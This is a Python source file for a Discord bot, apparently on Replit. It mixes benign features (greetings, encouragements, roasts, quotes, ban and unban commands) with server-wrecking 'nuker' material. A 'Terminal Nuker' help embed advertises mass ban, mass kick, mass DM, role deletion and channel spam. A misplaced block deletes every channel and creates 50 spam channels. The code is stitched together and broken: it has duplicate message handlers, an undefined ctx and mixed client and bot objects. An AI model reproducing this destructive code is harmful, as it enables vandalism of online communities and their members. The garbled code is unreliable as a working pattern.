#These are all of the things that I had to import for the bot to work how I want it to work
import discord as d
import os
import requests as r
import time as t
import json
import random as rndm
import colorama
from colorama import Fore
import asyncio as a
from replit import db
from keep_alive import keep_alive
from discord.ext import commands
from discord import Game

client = d.Client()

description = '''An example bot to showcase the discord.ext.commands extension
module.
There are a number of utility commands being showcased here.'''

intents = d.Intents.default()
intents.members = True

bot = commands.Bot(
	command_prefix=".",  # Change to desired prefix
	case_insensitive=True  # Commands aren't case-sensitive
)

greetings = ['hi', 'Hi', 'HI', 'hi!', 'Hi!', 'HI!', 'sup', 'Sup', 'hello', 'Hello', 'hello!', 'Hello!', 'hey', 'Hey', 'Whats up', 'whats up', 'hola', 'Hola']

sad_words = ['sad', 'Sad', 'depressed', 'unhappy', 'angry', 'miserable', 'crying', 'cry', 'mourn', 'regretful', 'sorrowful', 'dispair', 'despair', 'depressing', 'lonely']

starter_encouragements = ['Cheer up!', 'Hang in there!', 'Just remember, you are a great person!', 'Hey, at least you have feelings. I dont because I am a bot.', '“Everyone has inside them a piece of good news. The good news is you don’t know how great you can be! How much you can love! What you can accomplish! And what your potential is.” – Anne Frank', 'Everything you need to accomplish your goals is already in you.', 'I’m proud of you. I just wanted to tell you in case no one has.']

thanks = ['thanks', 'Thanks', 'Thank you', 'thx', 'thnx', 'Thx', 'Thnx', 'thank u', 'Thank u', 'thanks a lot', 'Thanks a lot', 'thx a lot', 'thnx a lot']

roasts = ['You’re a grey sprinkle on a rainbow cupcake.', 'You are more disappointing than an unsalted pretzel.', 'If your brain was dynamite, there wouldn’t be enough to blow your hat off.', 'Light travels faster than sound which is why you seemed bright until you spoke.', 'I’ll never forget the first time we met. But I’ll keep trying.', 'Hold still. I’m trying to imagine you with personality.', 'Your face makes onions cry.', 'I’m not a nerd, I’m just smarter than you.', 'Your face is just fine but we’ll have to put a bag over that personality.', 'You bring everyone so much joy… when you leave the room.', ' I thought of you today. It reminded me to take out the trash.', 'You are like a cloud. When you disappear it’s a beautiful day.']

bad_words = ['bad', 'slow', 'ugly', 'dumb', 'stupid']

laugh = ['lol', 'LOL', 'Lol', 'lmaoo', 'lmao', 'lmfao', 'lmfaoo', 'LMAO', 'LMAOO', 'LMFAO', 'LMFAOO', 'xD', 'XD', 'xd', 'hahaha', 'hehehe', 'HAHA', 'haha', 'HAHAHA']

phrases = ['Roast me bot', 'roast me bot', 'Roast me again bot', 'bot roast me', 'Hey bot, roast me', 'Roast me bot.', 'roast me bot.', 'can you roast me bot?', 'can you roast me bot', 'bot please roast me', 'Bot please roast me', 'Bot roast me.', 'bot roast me.', 'ROAST ME BOT', 'roast me']

if "responding" not in db.keys():
  db["responding"] = True

#Sources: https://docs.python.org/3/library/json.html

channels = "Channels To Spam Names"

def get_quote():
  response = r.get('https://zenquotes.io/api/random')
  json_data = json.loads(response.text)
  quote = json_data[0]['q'] + ' -' + json_data[0]['a']
  return(quote)

def update_encouragements(encouraging_message):
  if "encouragements" in db.keys():
    encouragements = db["encouragements"]
    encouragements.append(encouraging_message)
    db["encouragements"] = encouragements
  else:
    db["encouragements"] = [encouraging_message]

def delete_encouragement(index):
  encouragements = db["encouragements"]
  if len(encouragements) > index:
    del encouragements[index]
    db["encouragements"] = encouragements 

#Sources: https://www.aeracode.org/2018/02/19/python-async-simplified/#:~:text=When%20you%20have%20an%20asynchronous,result%20when%20you%20await%20me%22.

@client.event
async def on_ready():
  game = d.Game("with human brains")
  await client.change_presence(status=d.Status.online, activity=game)
  print("We have logged in as {0.user}".format(client))

@client.event
async def on_member_join(member):
  print(f'{member} has joined the server! Welcome!')

@client.event
async def on_member_leave(member):
  print(f'{member} has left the server! Cya!')

@bot.command()
async def kick(ctx, Member : d.Member, *, reason=None):
  await Member.kick(reason=reason)

#The below code bans player.
@bot.command()
@commands.has_permissions(ban_members = True)
async def ban(ctx, member : d.Member, *, reason = None):
    await member.ban(reason = reason)

#The below code unbans player.
@bot.command()
@commands.has_permissions(administrator = True)
async def unban(ctx, *, member):
    banned_users = await ctx.guild.bans()
    member_name, member_discriminator = member.split("#")

    for ban_entry in banned_users:
        user = ban_entry.user

        if (user.name, user.discriminator) == (member_name, member_discriminator):
            await ctx.guild.unban(user)
            await ctx.send(f'Unbanned {user.mention}')
            return

#https://discordpy.readthedocs.io/en/latest/api.html#embed

bot.remove_command("help")

#help commamd
@bot.command()
async def help(ctx):
        await ctx.message.delete()
        embed = d.Embed(color=000000, timestamp=ctx.message.created_at)
        embed.set_author(name=" 🌠 Terminal Nuker")
        embed.add_field(name="`NUKE`", value="- destroys the server")
        embed.add_field(name="`SPAM`", value="- spams the server")
        embed.add_field(name="`BAN`", value="- bans all members in the server")
        embed.add_field(name="`KICK`", value="- kicks all members in the server")
        embed.add_field(name="`MASSDM {MSG}`", value="- dms everyone in the server with the message provided")
        embed.add_field(name="`SNAME`", value="- changes the server name!")
        embed.add_field(name="`ROLES`", value="- deletes all roles in the server, and creates new ones")
        embed.add_field(name="`DCHANNELS`", value="- deletes all channels in the server")
        embed.add_field(name="`SCHANNELS`", value="- spams channels in the server")
        embed.set_image(url="")
        await ctx.send(embed=embed)

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    message_content = message.content.lower()
    if "flip a coin" in message_content:
        rand_int = rndm.randint(0, 1)
        if rand_int == 0:
            results = "Heads"
        else:
            results = "Tails"
        await message.channel.send(results)

@client.event
async def on_message(message):
  if message.author == client.user:
    return

  msg = message.content

  for word in bad_words:
    if message.content.count(word) > 0:
      await message.channel.purge(limit=1)

  if any(word in msg for word in greetings):
    t.sleep(0.5)
    await message.channel.send(rndm.choice(greetings))

  if any(word in msg for word in bad_words):
    t.sleep(0.5)
    await message.channel.send('Whats wrong with you dude dont say that!')
  
  if any(word in msg for word in thanks):
    t.sleep(0.5)
    await message.channel.send('Np')

  if any(word in msg for word in phrases):
    await message.channel.send(rndm.choice(roasts))

  if any(word in msg for word in laugh):
    t.sleep(0.5)
    await message.channel.send('What is so funny?')

  if message.content.startswith('Inspire me'):
    t.sleep(0.5)
    quote = get_quote()
    await message.channel.send(quote)

  if db["responding"]:
    options = starter_encouragements
    if "encouragements" in db.keys():
      options = options + db["encouragements"]

    if any(word in msg for word in sad_words):
      await message.channel.send(rndm.choice(starter_encouragements))

  if msg.startswith("New encouraging quote:"):
    encouraging_message = msg.split("New encouraging quote: ",1)[1]
    update_encouragements(encouraging_message)
    await message.channel.send("New encouraging message has been added!")

  if msg.startswith("Delete encouraging quote:"):
    encouragements = []
    if "encouragements" in db.keys():
      index = int(msg.split("Delete encouraging quote: " ,1)[1])
      delete_encouragement(index)
      encouragements = db["encouragements"]
    await message.channel.send(encouragements)

  if msg.startswith("List the quotes that people added"):
    encouragements = []
    if "encouragements" in db.keys():
      encouragements = db["encouragements"]
    await message.channel.send(encouragements)

  if msg.startswith("Responding is"):
    value = msg.split("Responding is ",1)[1]

    if value.lower() == "true":
      db["Responding is"] = True
      await message.channel.send("Responding is on.")
    else:
      db["Reponding is"] = False
      await message.channel.send("Responding is off.")

#deleting channels
    print("ENTERING: Deleting channels")

    try:
      for channel in ctx.guild.channels:
        await channel.delete()
        print("Channel deleted")
    except:
      pass
      print("Channel could not be deleted")
    
#creating channels

    print("ENTERING: Creating channels")

    try:
      for i in range(50):
        guild = ctx.message.guild
        await guild.create_text_channel(channels)
        print("Channel created")
    except:
      pass
      print("Channel could not be created")

#keep_alive just keeps the code running forever and ever by pinging this repl.it every 10 minutes
keep_alive()
client.run(os.getenv('Something'))